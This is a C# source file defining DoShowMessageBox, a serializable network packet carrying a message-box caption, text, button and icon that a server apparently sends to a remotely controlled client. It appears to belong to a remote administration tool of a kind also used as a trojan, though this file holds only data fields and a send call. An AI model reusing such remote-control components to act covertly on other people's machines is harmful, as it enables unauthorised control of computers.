using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoShowMessageBox : IPacket
    {
        public string Caption { get; set; }

        public string Text { get; set; }

        public string MessageboxButton { get; set; }

        public string MessageboxIcon { get; set; }

        public DoShowMessageBox()
        {
        }

        public DoShowMessageBox(string caption, string text, string messageboxbutton, string messageboxicon)
        {
            this.Caption = caption;
            this.Text = text;
            this.MessageboxButton = messageboxbutton;
            this.MessageboxIcon = messageboxicon;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}